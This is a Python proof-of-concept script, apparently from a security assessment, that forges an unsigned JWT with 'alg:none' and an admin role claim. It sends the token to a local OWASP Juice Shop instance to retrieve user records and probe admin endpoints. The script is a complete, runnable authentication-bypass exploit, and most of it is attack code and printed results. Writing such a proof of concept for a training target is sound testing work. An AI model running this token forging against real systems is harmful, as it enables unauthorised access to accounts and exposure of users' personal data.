"""
F-003: JWT alg:none Algorithm Confusion Attack — Proof of Concept
Target: http://localhost:3000 (OWASP Juice Shop)
CWE-347: Improper Verification of Cryptographic Signature
CVSS 3.1: 9.8 CRITICAL

Description:
  Forges a JWT token with alg:none (no signature) and uses it to
  access protected admin API endpoints without any credentials.
"""

import ast
import base64
import json
import sys
import urllib.request
import urllib.error

TARGET = "http://localhost:3000"


def b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    """Base64url decode with auto-padding."""
    padding = 4 - len(s) % 4
    if padding == 4:
        padding = 0
    return base64.urlsafe_b64decode(s + "=" * padding)


def forge_alg_none_token(user_id: int = 1, role: str = "admin", email: str = "hacker@pwned.com") -> str:
    """
    Build a JWT token with alg:none and an empty signature.
    The server must REJECT this — if it does not, the vulnerability is confirmed.
    """
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "status": "success",
        "data": {
            "id": user_id,
            "username": "hacker",
            "email": email,
            "role": role,
        },
        "iat": 9999999999,
    }
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    # Signature is empty — that is the entire point of alg:none
    return f"{h}.{p}."


def http_get(url: str, token: str = None) -> tuple:
    """Return (status_code, body_str)."""
    req = urllib.request.Request(url)
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def http_post(url: str, body: dict) -> tuple:
    """POST JSON, return (status_code, body_str)."""
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def decode_jwt(token: str) -> dict:
    """Decode JWT header and payload without verification."""
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return {"header": header, "payload": payload}


def run():
    results = {}

    print("=" * 70)
    print("F-003: JWT alg:none Attack PoC")
    print(f"Target: {TARGET}")
    print("=" * 70)

    # Step 1: Verify target is reachable
    print("\n[*] Step 1: Checking target availability...")
    status, _ = http_get(f"{TARGET}/")
    assert status == 200, f"Target unreachable: HTTP {status}"
    print(f"    [+] Target online: HTTP {status}")
    results["target_online"] = True

    # Step 2: Confirm /api/Users/ requires authentication
    print("\n[*] Step 2: Confirming /api/Users/ requires authentication (no token)...")
    status, body = http_get(f"{TARGET}/api/Users/")
    print(f"    Status without token: HTTP {status}")
    requires_auth = status in (401, 403, 500)
    print(f"    [{'+'  if requires_auth else '-'}] Endpoint {'is' if requires_auth else 'is NOT'} protected")
    results["endpoint_protected_without_token"] = requires_auth

    # Step 3: Forge alg:none token
    print("\n[*] Step 3: Forging JWT token with alg:none...")
    forged = forge_alg_none_token(user_id=1, role="admin", email="hacker@pwned.com")
    decoded = decode_jwt(forged)
    print(f"    Forged token: {forged[:80]}...")
    print(f"    Header:  {json.dumps(decoded['header'])}")
    print(f"    Payload: {json.dumps(decoded['payload'])}")
    results["forged_token"] = forged

    # Step 4: Use forged token to access /api/Users/
    print("\n[*] Step 4: Using forged token on GET /api/Users/...")
    status, body = http_get(f"{TARGET}/api/Users/", token=forged)
    print(f"    HTTP Status: {status}")
    vuln_confirmed = status == 200
    if vuln_confirmed:
        try:
            data = json.loads(body)
            user_count = len(data.get("data", []))
            print(f"    [CRITICAL] Vulnerability CONFIRMED — received {user_count} user records")
            results["users_exfiltrated"] = user_count
            # Show first 3 users
            for u in data["data"][:3]:
                print(f"      id={u['id']} email={u['email']} role={u['role']}")
        except json.JSONDecodeError:
            print(f"    [CRITICAL] Vulnerability CONFIRMED — got 200, body: {body[:200]}")
    else:
        print(f"    [-] Request rejected: HTTP {status}")
    results["alg_none_bypass_confirmed"] = vuln_confirmed

    # Step 5: Test additional admin endpoints
    print("\n[*] Step 5: Testing additional endpoints with forged token...")
    endpoints = [
        "/api/Feedbacks/",
        "/api/Complaints/",
        "/rest/admin/application-version",
    ]
    accessible = []
    for ep in endpoints:
        s, b = http_get(f"{TARGET}{ep}", token=forged)
        symbol = "+" if s == 200 else "-"
        print(f"    [{symbol}] {ep} -> HTTP {s}")
        if s == 200:
            accessible.append(ep)
    results["additional_accessible_endpoints"] = accessible

    # Step 6: Demonstrate with attacker-chosen email
    print("\n[*] Step 6: Escalation — forging token for arbitrary user (id=1 admin)...")
    forged_admin = forge_alg_none_token(user_id=1, role="admin", email="attacker@evil.com")
    status, body = http_get(f"{TARGET}/api/Users/", token=forged_admin)
    print(f"    [{'+'  if status == 200 else '-'}] /api/Users/ with custom email claim -> HTTP {status}")
    results["arbitrary_claim_accepted"] = (status == 200)

    # Summary
    print("\n" + "=" * 70)
    print("RESULTS SUMMARY")
    print("=" * 70)
    for k, v in results.items():
        print(f"  {k}: {v}")

    vuln_present = results.get("alg_none_bypass_confirmed", False)
    print(f"\nFINAL VERDICT: {'[CRITICAL] VULNERABLE — alg:none bypass confirmed' if vuln_present else '[INFO] Not vulnerable to alg:none'}")
    return 0 if vuln_present else 1


if __name__ == "__main__":
    # Verify syntax is valid before running (required by task)
    with open(__file__) as f:
        src = f.read()
    ast.parse(src)
    sys.exit(run())
